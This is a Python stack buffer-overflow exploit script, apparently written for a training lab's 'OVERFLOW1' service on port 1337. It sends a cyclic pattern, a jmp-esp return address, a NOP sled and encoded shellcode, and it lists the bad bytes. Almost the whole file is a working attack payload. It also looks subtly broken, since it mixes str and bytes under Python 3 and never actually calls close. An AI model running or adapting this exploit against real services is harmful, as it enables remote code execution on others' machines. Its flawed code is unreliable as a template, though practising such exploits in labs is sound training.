#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.142.78"
port = 1337
timeout = 5

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8C"
eip = "\xaf\x11\x50\x62"
#adress = 0x625011af - jmp esp
#badbytes = \x00\x07\x2e\xa0
nops = "\x90"*24
buf =  b""
buf += b"\xbe\x57\x82\x83\x9c\xdb\xd5\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x31\x31\x72\x13\x83\xc2\x04\x03\x72"
buf += b"\x58\x60\x76\x60\x8e\xe6\x79\x99\x4e\x87\xf0\x7c"
buf += b"\x7f\x87\x67\xf4\x2f\x37\xe3\x58\xc3\xbc\xa1\x48"
buf += b"\x50\xb0\x6d\x7e\xd1\x7f\x48\xb1\xe2\x2c\xa8\xd0"
buf += b"\x60\x2f\xfd\x32\x59\xe0\xf0\x33\x9e\x1d\xf8\x66"
buf += b"\x77\x69\xaf\x96\xfc\x27\x6c\x1c\x4e\xa9\xf4\xc1"
buf += b"\x06\xc8\xd5\x57\x1d\x93\xf5\x56\xf2\xaf\xbf\x40"
buf += b"\x17\x95\x76\xfa\xe3\x61\x89\x2a\x3a\x89\x26\x13"
buf += b"\xf3\x78\x36\x53\x33\x63\x4d\xad\x40\x1e\x56\x6a"
buf += b"\x3b\xc4\xd3\x69\x9b\x8f\x44\x56\x1a\x43\x12\x1d"
buf += b"\x10\x28\x50\x79\x34\xaf\xb5\xf1\x40\x24\x38\xd6"
buf += b"\xc1\x7e\x1f\xf2\x8a\x25\x3e\xa3\x76\x8b\x3f\xb3"
buf += b"\xd9\x74\x9a\xbf\xf7\x61\x97\x9d\x9d\x74\x25\x98"
buf += b"\xd3\x77\x35\xa3\x43\x10\x04\x28\x0c\x67\x99\xfb"
buf += b"\x69\x97\xd3\xa6\xdb\x30\xba\x32\x5e\x5d\x3d\xe9"
buf += b"\x9c\x58\xbe\x18\x5c\x9f\xde\x68\x59\xdb\x58\x80"
buf += b"\x13\x74\x0d\xa6\x80\x75\x04\xc5\x47\xe6\xc4\x24"
buf += b"\xe2\x8e\x6f\x39"


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip,port))
    s.recv(1024)
    s.send("OVERFLOW1 " + buffer + eip + nops + buf + "\r\n")
    s.recv(1024)
    s.close
except:
    print("Could not connect to " + ip + ":" + str(port))
    sys.exit(0) 
time.sleep(1)    
